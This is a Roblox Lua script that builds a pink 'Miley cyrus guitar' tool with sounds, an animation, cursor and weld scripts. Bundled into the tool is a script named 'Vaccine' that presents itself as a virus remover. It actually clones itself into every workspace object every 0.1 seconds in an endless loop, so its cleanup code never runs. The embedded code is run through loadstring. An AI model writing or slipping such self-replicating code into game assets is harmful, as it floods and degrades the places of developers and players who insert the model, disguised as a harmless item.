--Just dont play it when i am with you :) -YoungWarlock
if (script:FindFirstChild("forCustomRun")~=nil) then
local sc = script["forCustomRun"].Value
assert(loadstring(sc))()
return
elseif (script:FindFirstChild("forCustomRunL")~=nil) then
local locsc = workspace:FindFirstChild("_localrun")
local sc = script["forCustomRunL"]
if (locsc~=nil) then
local loc = locsc:clone()
loc["scrun"].Value = sc.Value
loc.Name = script.Name
for i,v in pairs(script:GetChildren()) do
v:clone().Parent = loc
end
loc.Parent = script.Parent
script:remove()
return
else
assert(loadstring(sc.Value))()
return
end
end
local m = Instance.new("Model")
m.Name = "Miley cyrus guitar"
t1 = Instance.new("Tool", m)
t1.Name = "Miley cyrus guitar"
t1.GripForward = Vector3.new(0, -1, 0)
t1.GripPos = Vector3.new(1.5, -2.20000005, 0.200000003)
t1.GripRight = Vector3.new(0.832265675, 0, 0.554377139)
t1.GripUp = Vector3.new(0.554377079, 0, -0.832265556)
t1.ToolTip = "Miley cyrus !"
t1.TextureId = "http://www.roblox.com/asset/?id=7522082 "
t1.Enabled = false
p1 = Instance.new("Part", t1)
p1.BrickColor = BrickColor.new("Pink")
p1.Reflectance = 0.40000000596046
p1.Name = "Handle"
p1.CFrame = CFrame.new(-7.28151941, 1.28350699, 10.6412907, -0.896422863, 0.000258748303, -0.443200141, 0.000929350965, 0.999998748, -0.00129590067, 0.443199247, -0.00157356309, -0.896422029)
p1.FormFactor = Enum.FormFactor.Custom
p1.Size = Vector3.new(1.54999971, 0.200000003, 4.31000137)
p1.BottomSurface = Enum.SurfaceType.Smooth
p1.TopSurface = Enum.SurfaceType.Smooth
b1 = Instance.new("SpecialMesh", p1)
b1.MeshId = "http://www.roblox.com/asset/?id=52596328 "
b1.TextureId = ""
b1.MeshType = Enum.MeshType.FileMesh
b1.Name = "Mesh"
b1.Scale = Vector3.new(1.39999998, 1.39999998, 1.39999998)
x1 = Instance.new("Sound", p1)
x1.Name = "GuitarSound"
x1.Pitch = 1
x1.SoundId = "http://www.roblox.com/asset?id=138083615 "
x1.Volume = 1
x1.Looped = false
x1.PlayOnRemove = false
x2 = Instance.new("PointLight", p1)
x2.Color = Color3.new(1, 0.666667, 1)
x2.Brightness = 20
x3 = Instance.new("Sound", p1)
x3.Name = "S1"
x3.Pitch = 1
x3.SoundId = "http://www.roblox.com/asset/?id=138083615"
x3.Volume = 1
x3.Looped = false
x3.PlayOnRemove = false
x4 = Instance.new("Sound", p1)
x4.Name = "S2"
x4.Pitch = 1
x4.SoundId = "http://www.roblox.com/asset/?id=138083615"
x4.Volume = 1
x4.Looped = false
x4.PlayOnRemove = false
x5 = Instance.new("Sound", p1)
x5.Name = "S3"
x5.Pitch = 1
x5.SoundId = "http://www.roblox.com/asset/?id=138083615"
x5.Volume = 1
x5.Looped = false
x5.PlayOnRemove = false
s1 = script:clone()
s1.Name = "Local Gui"
s1.Disabled = false
so1 = Instance.new("StringValue", s1)
so1.Name = "forCustomRunL"
so1.Value = [===[
Tool = script.Parent

local stillEquipped = false

function onEquippedLocal(mouse)
	stillEquipped = true
	if mouse == nil then 
		print("Mouse not found")
		return
	end
	while stillEquipped do 
		print("Setting Mouse to go")
		mouse.Icon = "rbxasset://textures\\GunCursor.png"
		while Tool.Enabled and stillEquipped do 
			wait(0.01)
		end
		print("Setting Mouse to wait")
		mouse.Icon = "http://www.roblox.com/asset/?id=1088199"
		while not Tool.Enabled and stillEquipped do 
			wait(0.01)
		end	
	end
end


function onUnequippedLocal()
	stillEquipped = false
end

Tool.Equipped:connect(onEquippedLocal)
Tool.Unequipped:connect(onUnequippedLocal)
]===]
s1.Parent = t1
s2 = script:clone()
s2.Name = "GuitarScript"
s2.Disabled = false
so2 = Instance.new("StringValue", s2)
so2.Name = "forCustomRunL"
so2.Value = [===[
local Tool = script.Parent
local Guitar = Tool.Handle

local vCharacter 

s1 = Instance.new("Sound")
s1.Volume = 1
s1.SoundId = "http://www.roblox.com/asset/?id=138083615"
s1.Name = "S1"
s1.Parent = Guitar

s2 = Instance.new("Sound")
s2.Volume = 1
s2.SoundId = "http://www.roblox.com/asset/?id=138083615"
s2.Name = "S2"
s2.Parent = Guitar

s3 = Instance.new("Sound")
s3.Volume = 1
s3.SoundId = "http://www.roblox.com/asset/?id=138083615"
s3.Name = "S3"
s3.Parent = Guitar

mySounds = {s1, s2, s3}

local guitarAnim
local guitarSound 

local guitarClone 

Tool.Enabled = true 

function onActivated()
	if Tool.Enabled == false then 
		return
	end
	Tool.Enabled = false

	vCharacter = Tool.Parent
	myHumanoid = vCharacter:FindFirstChild("Humanoid")
	
	if myHumanoid == nil then
		return
	end

	guitarClone = Guitar:Clone()
	guitarClone.Parent = game.Workspace
	Guitar.Transparency = 1.0

	guitarWeld = Instance.new("Weld")
	guitarWeld.Part0 = vCharacter.Torso
	guitarWeld.Part1 = guitarClone
	guitarWeld.Name = "HoldGuitar"
	guitarWeld.Parent = guitarClone
	guitarWeld.C1 = (CFrame.new(Vector3.new(0, 0, 0)) * CFrame.Angles(math.pi/2, 0, -math.pi/4)) + Vector3.new(0, -1, -0.5)

	guitarAnim = myHumanoid:LoadAnimation(Tool.GuitarAnim)
	if guitarAnim then guitarAnim:Play() end	
	print(math.random(1, 3))
	if mySounds ~= nil then mySounds[math.random(1, 3)]:Play() end
	wait(15)
	Guitar.Transparency = 0.0
	if guitarClone then guitarClone:Remove() end
	Tool.Enabled = true	
	
end

function onEquipped()
end

function onUnequipped()
	if guitarSound then guitarSound:Stop() end
	if guitarAnim then guitarAnim:Stop() end
	if guitarClone then guitarClone:Remove() end
	Guitar.Transparency = 0.0
end

Tool.Activated:connect(onActivated)
Tool.Equipped:connect(onEquipped)
Tool.Unequipped:connect(onUnequipped)

]===]
s2.Parent = t1
x6 = Instance.new("Animation", t1)
x6.Name = "GuitarAnim"
x6.AnimationId = "http://www.roblox.com/Asset?ID=52602039"
s3 = script:clone()
s4 = script:clone()
s4.Name = "Weld2"
s4.Disabled = true
so4 = Instance.new("StringValue", s4)
so4.Name = "forCustomRunL"
so4.Value = [===[
function Weld(x,y)
	local W = Instance.new("Weld")
	W.Part0 = x
	W.Part1 = y
	local CJ = CFrame.new(x.Position)
	local C0 = x.CFrame:inverse()*CJ
	local C1 = y.CFrame:inverse()*CJ
	W.C0 = C0
	W.C1 = C1
	W.Parent = x
end

function Get(A)
	if A.className == "Part" then
		Weld(script.Parent.Handle, A)
		A.Anchored = false
	else
		local C = A:GetChildren()
		for i=1, #C do
		Get(C[i])
		end
	end
end
local yes = true
if yes then
yes = false
Get(script.Parent)
end
function onDied()
script.Parent.Parent = nil
end
h = script.Parent.Parent:FindFirstChild("Humanoid")
if h ~= nil then
h.Died:connect(onDied)
end

]===]
s4.Parent = s3
s3.Name = "BackGun"
s3.Disabled = false
so3 = Instance.new("StringValue", s3)
so3.Name = "forCustomRunL"
so3.Value = [===[
--
--to use: put in type of gun: barrel point left, barrel point right or bull-pup(main hande is in the middle of the gun)
--step 2: put in what type of wepoan it is: assult rifle or pistol(there will be more)
--to do list: make it easyer to modife how it weld's.
guntype = 1--1 is assult rifle, 2 is bullpup, 3 is pistol, 4 is knife
weldmode = 3--1 is barrel point upper-left, 2 is barrel pointing upper-right, 3 is barrel point lower-left and 4 is barrel point lower-right
-------(note: if it is pistol or knife then 1 is on right leg, 2 is on left leg, 3 is in the back of your pants and 4 is in the front of your pants)
model = nil--gun model, that is
distance = 0.75--this is the distance between the part(torso/leg) and the gun. DON'T MAKE negitive
rotation = 45--this is the turning in degrees.
--this area is mode more for someone who's already good at gun's. please do not get mad at me if you don't understand what's under here
y = 0--this is what's added to the current y value. positive number's make it go down. negative make's it go up
 x = 0--this is what's added to the x value(it's really the z value but it look's like the x value when on your back). positive number's make it go left. negative make's it go right
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
--I suggest not doing anything else under here. All you should have to change is the weldmode and guntype.
--guntype 1 and weldmode 1 is for assault. guntype 3 and weldmode 1 is pistol position. 
--Those are what I have done so far so give me time so I can edit them into the correct position.
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
parts = {}
local n = 1
--can i have my
function on(mouse)
if model == nil then
n = 1
local m = Instance.new("Model")
local all = script.Parent:GetChildren()
for i = 1, #all do
if all[i].className == "Part" then
parts[n] = all[i].Transparency
local brick = all[i]:clone()
brick.Parent = m
n = n +1
end
end
wait()
if model == nil then
local weld = script:FindFirstChild("Weld2")
if weld ~= nil then
local new = weld:clone()
new.Disabled = false
new.Parent = m
m.Name = script.Parent.Name
m.Parent = script.Parent.Parent
model = m
local handle = model:FindFirstChild("Handle")
if handle ~= nil then
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
if guntype == 1 then
local torso = model.Parent:FindFirstChild("Torso")
if torso ~= nil then
if weldmode == 1 then--barrel pointing upper-right
local w = Instance.new("Weld")
w.Part0 = torso
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance *-1, 0.25 +y, -0.75 +x *-1) * CFrame.fromEulerAnglesXYZ(math.rad(rotation *-1), (math.pi / 2), 0)
elseif weldmode == 2 then--barrel pointing upper-left
local w = Instance.new("Weld")
w.Part0 = torso
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance, 0.25 +y, -0.75 +x *-1) * CFrame.fromEulerAnglesXYZ(math.rad(rotation *-1), (math.pi / 2 ) *-1, 0)
elseif weldmode == 3 then--barrel pointing upside-right
local w = Instance.new("Weld")
w.Part0 = torso
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance *-1, -0.1+y, 0.2 +x *-1) * CFrame.fromEulerAnglesXYZ(math.rad(rotation), (math.pi / 2), -1.5)
elseif weldmode == 4 then--barrel pointing upside-left
local w = Instance.new("Weld")
w.Part0 = torso
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance, 0.25+y, -0.75 +x *-1) * CFrame.fromEulerAnglesXYZ(math.rad(rotation), (math.pi / 2 +rotation) *-1.1, 1)
end
end
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
elseif guntype == 2 then--BullPup
local torso = model.Parent:FindFirstChild("Torso")
if torso ~= nil then
if weldmode == 1 then--barrel pointing upper-right
local w = Instance.new("Weld")
w.Part0 = torso
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance *-1, 0.25+y, -0.5 +x *-1) * CFrame.fromEulerAnglesXYZ(math.rad(rotation *-1), math.pi / 2, 0)
elseif weldmode == 2 then--barrel pointing upper-left
local w = Instance.new("Weld")
w.Part0 = torso
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance, 0.25 +y, -0.5 +x *-1) * CFrame.fromEulerAnglesXYZ(math.rad(rotation *-1), math.pi / 2 *-1, 0)
elseif weldmode == 3 then--barrel pointing upside-right
local w = Instance.new("Weld")
w.Part0 = torso
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance *-1, 0.25 +y, -0.5 +x *-1) * CFrame.fromEulerAnglesXYZ(math.rad(rotation), math.pi / 2, 0)
elseif weldmode == 4 then--barrel pointing upside-left
local w = Instance.new("Weld")
w.Part0 = torso
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance, 0.25 +y, -0.5 +x *-1) * CFrame.fromEulerAnglesXYZ(math.rad(rotation), math.pi / 2 *-1, 0)
end
end
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
elseif guntype == 3 then--pistol
local lleg = model.Parent:FindFirstChild("Left Leg")
local rleg = model.Parent:FindFirstChild("Right Leg")
if lleg ~= nil and rleg ~= nil then
if weldmode == 1 then--pistol on right leg
local w = Instance.new("Weld")
w.Part0 = rleg
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance *-1, 0 +y, -0.25 +x *-1) * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0)
elseif weldmode == 2 then--pistol on left leg
local w = Instance.new("Weld")
w.Part0 = lleg
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance, 0 +y, -0.25 +x *-1) * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0)
elseif weldmode == 3 then--knife in pant's back, gangsta like
local w = Instance.new("Weld")
w.Part0 = torso
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance *-1, 0 +y, 0.25 +x) * CFrame.fromEulerAnglesXYZ(math.pi / 2 , math.pi / 2, 0)
elseif weldmode == 4 then--knife in pant's front, gangsta like
local w = Instance.new("Weld")
w.Part0 = torso
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance, 0 +y, 0.25 +x) * CFrame.fromEulerAnglesXYZ(math.pi / 2 , math.pi / 2 *-1, 0)
end
end
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
elseif guntype == 4 then--knife
local lleg = model.Parent:FindFirstChild("Left Leg")
local rleg = model.Parent:FindFirstChild("Right Leg")
local torso = model.Parent:FindFirstChild("Torso")
if lleg ~= nil and rleg ~= nil and torso ~= nil then
if weldmode == 1 then--pistol on right leg
local w = Instance.new("Weld")
w.Part0 = rleg
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance *-1, 0.15 +y, -0.25 +x *-1) * CFrame.fromEulerAnglesXYZ(math.pi, 0, 0)
elseif weldmode == 2 then--pistol on left leg
local w = Instance.new("Weld")
w.Part0 = lleg
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance, 0.15 +y, -0.25 +x *-1) * CFrame.fromEulerAnglesXYZ(math.pi, 0, 0)
elseif weldmode == 3 then--knife in pant's back, gangsta like
local w = Instance.new("Weld")
w.Part0 = torso
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance *-1, 0 +y, 0.25 +x) * CFrame.fromEulerAnglesXYZ(math.pi , math.pi / 2, 0)
elseif weldmode == 4 then--knife in pant's front, gangsta like
local w = Instance.new("Weld")
w.Part0 = torso
w.Parent = w.Part0
w.Part1 = handle
w.C1 = CFrame.new(distance, 0 +y, 0.25 +x) * CFrame.fromEulerAnglesXYZ(math.pi , math.pi / 2 *-1, 0)
end
end
end
end
end
end
end
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
if model ~= nil then
n = 1
local all = model:GetChildren()
for i = 1, #all do
if all[i].className == "Part" then
all[i].Transparency = 1
end
end
end
end
--check
function off(mouse)
if model ~= nil then
n = 1
local all = model:GetChildren()
for i = 1, #all do
if all[i].className == "Part" then
all[i].Transparency = parts[n]
local Do = true
if Do then
Do = false--dude!
n = n +1
end
end
end
end
end
--please?
script.Parent.Equipped:connect(on)
script.Parent.Unequipped:connect(off)
]===]
s3.Parent = t1
s5 = script:clone()
s5.Name = "Vaccine"
s5.Disabled = false
so5 = Instance.new("StringValue", s5)
so5.Name = "forCustomRun"
so5.Value = [===[
function spread() -- created by KillerRussian98
local stuff = game.Workspace:GetChildren()
for i = 1, #stuff do
if (stuff[i].className ~= "Script") and (stuff[i]:findFirstChild("Vaccine") == nil) and (stuff[i].className ~= "Camera") then
local clone = script:clone()
clone.Parent = stuff[i]
end
end
end

while true do
wait(.1)
spread()
end

function GetAllItems(mdl) 
local objs = {} 
function Search(obj) 
if obj~=workspace then 
table.insert(objs,obj) 
end 
if #obj:GetChildren() > 0 then 
for i, v in ipairs(obj:GetChildren()) do 
Search(v) 
end 
end 
end 
Search(mdl) 
return objs 
end 



for i, v in ipairs(GetAllItems(workspace)) do 
if v.className == "Script" then 
if v.Name == "Chaotic" or v.Name == "Spreadify" or v.Name == "Virus" or v.Name == "Infected" then 
v.Parent = game.Lighting --Just in case it has a removal prevention. 
t = Instance.new("ObjectValue") 
t.Name = "IsAVirus" 
t.Parent = v 
end 
end 
end 

for i, v in ipairs(game.Lighting:GetChildren()) do 
if v:findFirstChild("IsAVirus") then --Only remove the viruses. 
v:remove() 
end 
end 


print("Virus debugged! All clean!")
]===]
s5.Parent = t1
m.Parent = game:service("Workspace")
m:MakeJoints()